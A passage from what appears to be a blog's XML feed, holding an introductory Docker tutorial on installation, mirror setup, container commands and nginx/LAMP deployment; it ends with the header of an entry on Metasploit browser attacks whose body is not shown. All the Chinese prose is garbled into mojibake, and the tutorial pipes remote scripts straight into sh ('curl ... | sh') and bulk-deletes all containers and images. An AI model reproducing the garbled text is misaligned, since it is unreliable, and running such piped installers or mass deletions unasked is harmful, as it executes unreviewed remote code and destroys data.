          <category> å·¥å…·æ”¶é›† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerå…¥é—¨&amp;&amp;ç¯å¢ƒéƒ¨ç½²å®ä¾‹</title>
      <link href="/2019/04/28/docker%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%AE%9E%E4%BE%8B/"/>
      <url>/2019/04/28/docker%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€dockerä»‹ç»"><a href="#ä¸€ã€dockerä»‹ç»" class="headerlink" title="ä¸€ã€dockerä»‹ç»"></a>ä¸€ã€dockerä»‹ç»</h1><p>dockeræ˜¯å¼€æºçš„åº”ç”¨ç¨‹åºå®¹å™¨å¼•æ“ï¼Œä½¿ç”¨goè¯­è¨€å¼€å‘ï¼Œå€ŸåŠ©äºdockeræ‰“åŒ…ç”¨æˆ·çš„åº”ç”¨ç¨‹åºï¼Œå°†è¿™äº›åº”ç”¨ç¨‹åºåŒ…å«åœ¨å®¹å™¨ä¸­ï¼Œå®ç°è™šæ‹ŸåŒ–ï¼Œå®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ç‹¬ç«‹ï¼Œå ç”¨èµ„æºéå¸¸å°‘ã€‚</p><a id="more"></a><h1 id="äºŒã€dockerä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µ"><a href="#äºŒã€dockerä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="äºŒã€dockerä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µ"></a>äºŒã€dockerä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µ</h1><ul><li><p>é•œåƒ</p><ul><li>image, dockeré•œåƒå°±æ˜¯ä¸€ä¸ªåªè¯»çš„æ¨¡æ¿ï¼Œä¾‹å¦‚ä¸€ä¸ªé•œåƒä¸­å¯ä»¥åŒ…å«å®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œé‡Œé¢å®‰è£…apache/php/mysqlç­‰ç¯å¢ƒï¼Œé•œåƒå¯ä»¥åˆ›å»ºå®¹å™¨</li></ul></li><li><p>å®¹å™¨</p><ul><li>containerï¼Œdockeråˆ©ç”¨å®¹å™¨è¿è¡Œç¨‹åºï¼Œå®¹å™¨æ˜¯ä»é•œåƒä¸­åˆ›å»ºè¿è¡Œçš„å®ä¾‹ï¼Œå®¹å™¨å¯ä»¥è¿è¡Œã€å…³é—­ã€åˆ é™¤</li></ul></li><li>ä»“åº“<ul><li>repositoryï¼Œé›†ä¸­å­˜æ”¾é•œåƒçš„åœ°æ–¹ï¼Œæ¯ä¸ªä»“åº“ä¸­åŒ…å«å¤šä¸ªé•œåƒï¼Œåˆ†ä¸ºç§æœ‰å’Œå…¬å¼€ï¼ŒdockerHub</li></ul></li></ul><h1 id="ä¸‰ã€dockerå®‰è£…"><a href="#ä¸‰ã€dockerå®‰è£…" class="headerlink" title="ä¸‰ã€dockerå®‰è£…"></a>ä¸‰ã€dockerå®‰è£…</h1><h2 id="1-ä¸€é”®å®‰è£…Docker"><a href="#1-ä¸€é”®å®‰è£…Docker" class="headerlink" title="1. ä¸€é”®å®‰è£…Docker"></a>1. ä¸€é”®å®‰è£…Docker</h2><ol><li><p>è¿™æ˜¯æ¨èæ–¹å¼ã€‚åœ¨æœªå®‰è£…è¿‡Dockerçš„æœºå™¨ä¸Šï¼Œrootæƒé™æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯ä¸€é”®å®‰è£…æœ€æ–°ç‰ˆDockerï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure></li><li><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„åŒ…ç®¡ç†å·¥å…·æ¥å®‰è£…ï¼Œæ¯”å¦‚åœ¨Ubuntuä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-æ‰‹åŠ¨å®‰è£…"><a href="#2-æ‰‹åŠ¨å®‰è£…" class="headerlink" title="2.æ‰‹åŠ¨å®‰è£…"></a>2.æ‰‹åŠ¨å®‰è£…</h2><p>å¸¸è§æ“ä½œç³»ç»Ÿå®‰è£…Dockerçš„æ–¹æ³•åœ¨æ–‡æ¡£ä¸­å‡å¯æŸ¥é˜…ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°ï¼š <a href="https://docs.docker.com/engine/installation/" target="_blank" rel="noopener">https://docs.docker.com/engine/installation/</a></p><p><strong>æ³¨æ„</strong>ï¼Œdockeræ˜¯ä¸€ä¸ªç³»ç»ŸæœåŠ¡ï¼Œæ‰€ä»¥ï¼Œå®‰è£…å®Œæˆåå¯èƒ½éœ€è¦æ‰‹å·¥å¯åŠ¨æœåŠ¡ï¼š<code>service start docker</code>ï¼Œå¦åˆ™ä¼šå‡ºç°è¿æ¥å¤±è´¥çš„æƒ…å†µã€‚åŒæ ·ï¼Œå¦‚æœdockeræ²¡æœ‰è‡ªå¯åŠ¨ï¼Œä½ ä¹Ÿéœ€è¦æ‰‹å·¥å¯åŠ¨dockeræœåŠ¡ã€‚å¦‚æœä½ æ˜¯ä½¿ç”¨ä¸€é”®å®‰è£…å·¥å…·å®‰è£…çš„dockerï¼Œåˆ™dockerä¼šè‡ªåŠ¨å¯åŠ¨ã€‚</p><h2 id="3-åŠ å…¥dockerç»„"><a href="#3-åŠ å…¥dockerç»„" class="headerlink" title="3. åŠ å…¥dockerç»„"></a>3. åŠ å…¥dockerç»„</h2><p>å®‰è£…å®Œæˆä¹‹åï¼Œæ™®é€šç”¨æˆ·æ¯æ¬¡æ‰§è¡Œdockerå‘½ä»¤éƒ½éœ€è¦åŠ ä¸Š<code>sudo</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åŠ å…¥dokerç”¨æˆ·ç»„è·å–æ“ä½œæƒé™</p><ol><li><p>ä½¿ç”¨æœ‰sudoæƒé™çš„å¸å·ç™»å½•ç³»ç»Ÿ</p></li><li><p>åˆ›å»ºdockeråˆ†ç»„ï¼Œå¹¶å°†ç›¸åº”çš„ç”¨æˆ·æ·»åŠ åˆ°è¿™ä¸ªåˆ†ç»„é‡Œé¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker your_username</span><br></pre></td></tr></table></figure></li><li><p>é€€å‡ºï¼Œç„¶åé‡æ–°ç™»å½•ï¼Œä»¥ä¾¿è®©æƒé™ç”Ÿæ•ˆ</p></li></ol><h2 id="4-æ·»åŠ å›½å†…é•œåƒä»“åº“"><a href="#4-æ·»åŠ å›½å†…é•œåƒä»“åº“" class="headerlink" title="4. æ·»åŠ å›½å†…é•œåƒä»“åº“"></a>4. æ·»åŠ å›½å†…é•œåƒä»“åº“</h2><p>ç”±äºå®˜æ–¹èµ„æºåº“åœ¨å›½å¤–ï¼Œæˆ‘ä»¬åœ¨æ‹‰å–é•œåƒèµ„æºçš„æ—¶å€™ä¼šå¾ˆæ…¢ã€‚æ‰€ä»¥ï¼Œå›½å†…çš„Dockerçˆ±å¥½è€…ä»¬å°±æ·»åŠ äº†ä¸€äº›å›½å†…çš„é•œåƒï¼ˆmirrorï¼‰,æ–¹ä¾¿å¤§å®¶ä½¿ç”¨ã€‚</p><p><strong>å›½å†…åŠ é€Ÿç«™ç‚¹</strong></p><ul><li><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">é˜¿é‡Œäº‘</a></p></li><li><p><a href="https://c.163yun.com/hub#/m/home/" target="_blank" rel="noopener">ç½‘æ˜“äº‘</a></p></li><li><p><a href="https://www.daocloud.io/mirror" target="_blank" rel="noopener">DaoCloud</a></p></li></ul><ol><li><p>ä½¿ç”¨è„šæœ¬æ¥é…ç½®åŠ é€Ÿç«™ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨å‘½ä»¤æ¥é…ç½®åŠ é€Ÿç«™ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;&lt;your accelerate address&gt;&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»¥ä¸Šæ“ä½œåé‡å¯ä¸€ä¸‹ Docker</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure></li></ol><h1 id="äº”ã€dockeråŸºæœ¬ä½¿ç”¨"><a href="#äº”ã€dockeråŸºæœ¬ä½¿ç”¨" class="headerlink" title="äº”ã€dockeråŸºæœ¬ä½¿ç”¨"></a>äº”ã€dockeråŸºæœ¬ä½¿ç”¨</h1><h2 id="1-å¯åŠ¨docker"><a href="#1-å¯åŠ¨docker" class="headerlink" title="1. å¯åŠ¨docker"></a>1. å¯åŠ¨docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker//centos</span><br><span class="line">server docker start//ubuntu</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker info//å½“å‰å®¹å™¨çš„ä¿¡æ¯</span><br><span class="line">docker stats//è¿è¡Œå®¹å™¨çš„è¿›ç¨‹ä¿¡æ¯</span><br><span class="line">docker version//ç‰ˆæœ¬ä¿¡æ¯</span><br></pre></td></tr></table></figure><h2 id="2-é•œåƒæ“ä½œ"><a href="#2-é•œåƒæ“ä½œ" class="headerlink" title="2. é•œåƒæ“ä½œ"></a>2. é•œåƒæ“ä½œ</h2><p><strong>æœç´¢é•œåƒ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search [å…³é”®å­—]</span><br></pre></td></tr></table></figure><p><strong>æ‹‰å–é•œåƒ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [é•œåƒå…¨ç§°]:ç‰ˆæœ¬æ ‡ç­¾(å¯é€‰)</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æœ¬åœ°é•œåƒ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><strong>åˆ é™¤é•œåƒ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi []</span><br></pre></td></tr></table></figure><p><strong>å¯¼å‡ºé•œåƒ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save [å®¹å™¨id/åç§°] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>å¯¼å…¥é•œåƒ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker road &lt; test.tar</span><br></pre></td></tr></table></figure><h2 id="3-å®¹å™¨æ“ä½œ"><a href="#3-å®¹å™¨æ“ä½œ" class="headerlink" title="3. å®¹å™¨æ“ä½œ"></a>3. å®¹å™¨æ“ä½œ</h2><p><strong>å¯åŠ¨å®¹å™¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P --rm --name [å®¹å™¨åå­—] [é•œåƒåç§°] [å¯æ‰§è¡Œå‘½ä»¤]</span><br><span class="line">å‚æ•°è¯´æ˜ï¼š</span><br><span class="line">-dï¼šè®©å®¹å™¨åœ¨åå°è¿è¡Œ</span><br><span class="line">-Pï¼šå°†å®¹å™¨å†…éƒ¨ä½¿ç”¨çš„ç½‘ç»œç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœº</span><br><span class="line">-pï¼š[ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£] å¯è‡ªå®šä¹‰æ˜ å°„ç«¯å£</span><br><span class="line">--nameï¼šå¯è‡ªå®šä¹‰å®¹å™¨åç§°</span><br><span class="line">--rmï¼šå½“å®¹å™¨åœæ­¢æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ é™¤</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹è¿è¡Œå®¹å™¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å®¹å™¨ç«¯å£</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port [å®¹å™¨id/åç§°]</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å®¹å™¨å†…éƒ¨æ—¥å¿—</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f [å®¹å™¨id/åç§°] //å¯ä»¥æŸ¥çœ‹å®¹å™¨å†…éƒ¨çš„æ ‡å‡†è¾“å‡º</span><br><span class="line">-f: è®© docker logs åƒä½¿ç”¨ tail -f ä¸€æ ·æ¥è¾“å‡ºå®¹å™¨å†…éƒ¨çš„æ ‡å‡†è¾“å‡º</span><br></pre></td></tr></table></figure><p><strong>è¿›å…¥å®¹å™¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [å®¹å™¨id/åç§°] /bin/bash//æ¨èä½¿ç”¨</span><br><span class="line">docker attach [å®¹å™¨id/åç§°] //ä¸ä¼šåœ¨å®¹å™¨ä¸­åˆ›å»ºè¿›ç¨‹æ‰§è¡Œé¢å¤–çš„å‘½ä»¤ï¼Œåªæ˜¯é™„ç€åˆ°å®¹å™¨ä¸Š</span><br><span class="line">//attachå¿…é¡»ç™»é™†åˆ°ä¸€ä¸ªå·²ç»è¿è¡Œçš„å®¹å™¨é‡Œï¼Œå¦‚æœä»è¿™ä¸ªå®¹å™¨ä¸­exité€€å‡ºçš„è¯ï¼Œå°±ä¼šå¯¼è‡´å®¹å™¨åœæ­¢</span><br></pre></td></tr></table></figure><p><strong>ç¦»å¼€å®¹å™¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+P+Q//æ­£å¸¸é€€å‡ºä¸å…³é—­å®¹å™¨</span><br><span class="line">exit//é€€å‡ºä¹‹åå…³é—­å®¹å™¨,å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æµç¨‹è¿›è¡Œæ¢å¤</span><br><span class="line">ä½¿ç”¨docker restartå‘½ä»¤é‡å¯å®¹å™¨</span><br><span class="line">ä½¿ç”¨docker attachå‘½ä»¤è¿›å…¥å®¹å™¨</span><br></pre></td></tr></table></figure><p><strong>åœæ­¢å®¹å™¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [å®¹å™¨id/åç§°]</span><br></pre></td></tr></table></figure><p><strong>é‡æ–°å¼€å¯å®¹å™¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start [å®¹å™¨id/åç§°]</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ‰€æœ‰å®¹å™¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a [å®¹å™¨id/åç§°]</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å®¹å™¨åº•å±‚ä¿¡æ¯</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [å®¹å™¨id/åç§°]</span><br></pre></td></tr></table></figure><p><strong>åˆ é™¤å®¹å™¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [å®¹å™¨id/åç§°]</span><br><span class="line">//åˆ é™¤å‰å¿…é¡»å…ˆåœæ­¢æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br></pre></td></tr></table></figure><p><strong>å¯¼å‡ºå®¹å™¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export [å®¹å™¨id/åç§°] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>å¯¼å…¥å®¹å™¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import &lt; test.tar</span><br></pre></td></tr></table></figure><p><strong>dockeræ‰¹é‡åˆ é™¤å®¹å™¨ã€é•œåƒ</strong></p><p>ä¸€æ¡å‘½ä»¤å®ç°åœç”¨å¹¶åˆ é™¤å®¹å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -q) &amp; docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure><p>åˆ é™¤æ‰€æœ‰é•œåƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure><p>æŒ‰æ¡ä»¶åˆ é™¤å®¹å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker ps -a | awk &apos;/test\/webapp/ &#123;print $1&#125;&apos;)</span><br></pre></td></tr></table></figure><p>æŒ‰æ¡ä»¶åˆ é™¤é•œåƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#æ²¡æœ‰æ‰“æ ‡ç­¾</span><br><span class="line">docker rmi `docker images -q | awk &apos;/^&lt;none&gt;/ &#123; print $3 &#125;&apos;`</span><br><span class="line">#é•œåƒååŒ…å«å…³é”®å­—</span><br><span class="line">docker rmi --force `docker images | grep keywords | awk &apos;&#123;print $3&#125;&apos;`   </span><br><span class="line">//å…¶ä¸­keywordsä¸ºå…³é”®å­—</span><br></pre></td></tr></table></figure><h1 id="å…­ã€å®¹å™¨éƒ¨ç½²å®ä¾‹"><a href="#å…­ã€å®¹å™¨éƒ¨ç½²å®ä¾‹" class="headerlink" title="å…­ã€å®¹å™¨éƒ¨ç½²å®ä¾‹"></a>å…­ã€å®¹å™¨éƒ¨ç½²å®ä¾‹</h1><h3 id="1-å®‰è£…nginx"><a href="#1-å®‰è£…nginx" class="headerlink" title="1. å®‰è£…nginx"></a>1. å®‰è£…nginx</h3><ul><li>ä»docker hubä¸Šæ‹‰å–é•œåƒ</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx:latest</span><br></pre></td></tr></table></figure><ul><li>æ‰˜ç®¡ä¸€äº›ç®€å•çš„é™æ€å†…å®¹</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run --name some-nginx -v  $PWD/html:/usr/share/nginx/html:ro -d nginx</span><br><span class="line"> -v $PWD/html:/usr/share/nginx/htmlï¼šå°†ä¸»æœºä¸­å½“å‰ç›®å½•ä¸‹çš„htmlæŒ‚è½½åˆ°å®¹å™¨çš„/usr/share/nginx/html</span><br></pre></td></tr></table></figure><ul><li>æˆ–è€…å‡†å¤‡è‡ªå·±çš„é…ç½®æ–‡ä»¶å’Œæ–‡ä»¶ç›®å½•</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80:80 --name mynginx -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx</span><br><span class="line">#dockerhubä¸Šæœ‰è¯¦ç»†è‡ªå®šä¹‰é…ç½®éƒ¨ç½²è¯´æ˜</span><br><span class="line">-p 80:80ï¼šå°†å®¹å™¨çš„80ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„80ç«¯å£</span><br><span class="line">--name mynginxï¼šå°†å®¹å™¨å‘½åä¸ºmynginx</span><br><span class="line">-v $PWD/www:/wwwï¼šå°†ä¸»æœºä¸­å½“å‰ç›®å½•ä¸‹çš„wwwæŒ‚è½½åˆ°å®¹å™¨çš„/www</span><br><span class="line">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.confï¼šå°†ä¸»æœºä¸­å½“å‰ç›®å½•ä¸‹çš„nginx.confæŒ‚è½½åˆ°å®¹å™¨çš„/etc/nginx/nginx.conf</span><br><span class="line">-v $PWD/logs:/wwwlogsï¼šå°†ä¸»æœºä¸­å½“å‰ç›®å½•ä¸‹çš„logsæŒ‚è½½åˆ°å®¹å™¨çš„/wwwlogs</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼šå¦‚æœå‡ºç°ä»¥ä¸‹ç±»ä¼¼æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:344: starting container process caused &quot;process_linux.go:424: container init caused \&quot;rootfs_linux.go:58: mounting \\\&quot;/opt/nginx/conf/nginx.conf\\\&quot; to rootfs \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged\\\&quot; at \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged/etc/nginx/nginx.conf\\\&quot; caused \\\&quot;not a directory\\\&quot;\&quot;&quot;: unknown: Are you trying to mount a directory onto a file (or vice-versa)? Check if the specified host path exists and is the expected type.</span><br></pre></td></tr></table></figure><p>æ˜¯å› ä¸ºæ²¡æå‰åˆ›å»ºå¥½æŒ‚è½½ç›®å½•å’Œé…ç½®æ–‡ä»¶å¯¼è‡´conf/nginx.conf è‡ªåŠ¨åˆ›å»ºæˆç›®å½•ï¼Œåˆ é™¤å¹¶åˆ›å»ºnginx.confé…ç½®æ–‡ä»¶å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ll conf/</span><br><span class="line">rm -r conf/nginx.conf</span><br><span class="line">touch conf/nginx.conf</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹è¿è¡Œå®¹å™¨</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/dockerå…¥é—¨-ç¯å¢ƒéƒ¨ç½²å®ä¾‹/8268763-bde19eff6c1fd6ea.png" alt="å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨"></p><h3 id="2-å®‰è£…Lampç¯å¢ƒ"><a href="#2-å®‰è£…Lampç¯å¢ƒ" class="headerlink" title="2. å®‰è£…Lampç¯å¢ƒ"></a>2. å®‰è£…Lampç¯å¢ƒ</h3><p>æ‹‰å–ä¸€ä¸ªlampé•œåƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull fauria/lamp</span><br></pre></td></tr></table></figure><p>åˆ›å»ºlampç›®å½•&amp;æŒ‚è½½è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/lamp &amp;&amp; cd ~/lamp</span><br><span class="line">mkdir www logs</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®¹å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d  -p 80:80 -v /opt/lamp/www:/var/www/html -v /opt/lamp/logs/:/var/log/httpd --name my-lamp-container fauria/lamp</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ˜¯å¦å¯åŠ¨æˆåŠŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/dockerå…¥é—¨-ç¯å¢ƒéƒ¨ç½²å®ä¾‹/8268763-1fab64e3d8195ff5.png" alt="STATUSä¸ºUPè¯´æ˜å¯åŠ¨æˆåŠŸ"></p><p>æŸ¥çœ‹æ‰€æœ‰å®¹å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>è¿›å…¥ä¸€ä¸ªå·²ç»åœ¨è¿è¡Œçš„å®¹å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#å…¶ä¸­å­—ç¬¦ä¸²ä¸ºå®¹å™¨ID</span><br><span class="line">docker exec -it d27bd3998ad9 /bin/bash</span><br></pre></td></tr></table></figure><p>åˆ é™¤å®¹å™¨åˆ é™¤å‰å…ˆåœæ­¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop  d27b  &amp; docker rm d27b</span><br></pre></td></tr></table></figure><h1 id="ä¸ƒã€æœ€å"><a href="#ä¸ƒã€æœ€å" class="headerlink" title="ä¸ƒã€æœ€å"></a>ä¸ƒã€æœ€å</h1><p>æœ¬æ–‡åªæ˜¯èµ·åˆ°dockerçš„å…¥é—¨ä½œç”¨ï¼Œå¦‚æœæƒ³æ·±å…¥å­¦ä¹ </p><p>ä»¥ä¸‹æ¨èå‡ ä¸ªdokceråœ¨çº¿å­¦ä¹ ç½‘ç«™</p><p>[Docker æ•™ç¨‹ | èœé¸Ÿæ•™ç¨‹]<a href="http://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/docker/docker-tutorial.html</a></p><p>[Docker å…¥é—¨æ•™ç¨‹|é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—]<a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploitåˆ©ç”¨-æµè§ˆå™¨è‡ªåŠ¨æ”»å‡»</title>
      <link href="/2019/04/08/Metasploit%E5%88%A9%E7%94%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB/"/>
      <url>/2019/04/08/Metasploit%E5%88%A9%E7%94%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB/</url>
      
